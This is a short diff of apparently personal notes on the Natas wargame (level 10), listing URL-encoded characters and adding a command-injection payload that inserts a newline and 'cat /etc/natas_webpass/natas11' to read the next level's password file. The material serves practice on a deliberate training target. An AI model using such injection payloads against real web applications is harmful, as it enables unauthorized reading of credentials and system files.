@@ -9,3 +9,8 @@ key :
 8. .* : any characters
 9. . /etc/natas_webpass/natas11 #
 10. can use other commands !?
+key2 :
+1. %0A : \n
+2. %20 : space
+3. %23 : #
+3. %0A%20cat%20/etc/natas_webpass/natas11%20%23
